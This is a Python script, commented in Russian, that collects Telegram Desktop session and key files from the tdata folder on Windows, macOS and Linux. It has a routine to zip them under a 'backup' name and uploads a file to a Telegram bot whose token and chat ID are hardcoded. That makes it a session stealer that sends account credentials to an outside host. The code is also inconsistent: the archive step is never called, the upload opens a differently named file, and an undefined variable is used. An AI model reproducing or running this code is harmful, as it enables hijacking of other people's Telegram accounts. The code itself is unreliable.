import os
import shutil
import platform
import requests

def find_telegram_session():
    system = platform.system()
    session_paths = []
    
    if system == "Windows":
        base_paths = [
            os.path.expanduser("~\\AppData\\Roaming\\Telegram Desktop\\tdata"),
            os.path.expanduser("~\\Documents\\Telegram Desktop\\tdata")
        ]
    elif system == "Darwin":  # macOS
        base_paths = [
            os.path.expanduser("~/Library/Application Support/Telegram Desktop/tdata"),
            os.path.expanduser("~/Documents/Telegram Desktop/tdata")
        ]
    else:  # Linux
        base_paths = [
            os.path.expanduser("~/.local/share/TelegramDesktop/tdata"),
            os.path.expanduser("~/Telegram Desktop/tdata")
        ]
    
    for base_path in base_paths:
        if os.path.exists(base_path):
            session_files = []
            # Ищем основные файлы сессии
            target_files = [
                "map", "key_datas", "dumps", "user_data", 
                "settings", "cache"
            ]
            
            for root, dirs, files in os.walk(base_path):
                for file in files:
                    if any(target in file.lower() for target in target_files):
                        session_files.append(os.path.join(root, file))
            
            # Добавляем основные файлы из корня
            for file in os.listdir(base_path):
                if file.startswith("usertag") or file.startswith("settings") or file.endswith(".json"):
                    session_files.append(os.path.join(base_path, file))
            
            if session_files:
                session_paths.extend(session_files)
    
    return session_paths

def create_session_archive(session_files):
    archive_path = "telegram_session_backup.zip"
    temp_dir = "temp_telegram_session"
    
    # Создаем временную директорию
    if os.path.exists(temp_dir):
        shutil.rmtree(temp_dir)
    os.makedirs(temp_dir)
    
    # Копируем файлы сессии
    for session_file in session_files:
        try:
            if os.path.isfile(session_file):
                shutil.copy2(session_file, temp_dir)
        except Exception as e:
            print(f"Ошибка копирования {session_file}: {e}")
    
    # Создаем архив
    shutil.make_archive("telegram_session_backup", 'zip', temp_dir)
    
    # Удаляем временную директорию
    shutil.rmtree(temp_dir)
    
    return archive_path

def send_to_telegram(bot_token, chat_id):
    url = f"https://api.telegram.org/bot{bot_token}/sendDocument"
    
    with open("nsndb.zil", 'rb') as file:
        files = {'document': file}
        data = {'chat_id': chat_id}
        
        response = requests.post(url, files=files, data=data)
        
    return response.status_code == 200

def main():
    # Конфигурация
    BOT_TOKEN = "8310983310:AAFuVs8DzO3ROxYNN3I_YWxSSqNVwAxalcA"  # Замените на токен бота
    CHAT_ID = "8059961644"    # Замените на ID чата
    
    print("Поиск файлов сессии Telegram...")
    session_files = find_telegram_session()

    print("Отправка архива...")
    if send_to_telegram(BOT_TOKEN, CHAT_ID):
        print("Архив успешно отправлен")
        
        # Очистка
        os.remove(archive_path)
    else:
        print("Ошибка отправки архива")

if __name__ == "__main__":
    main()
input()
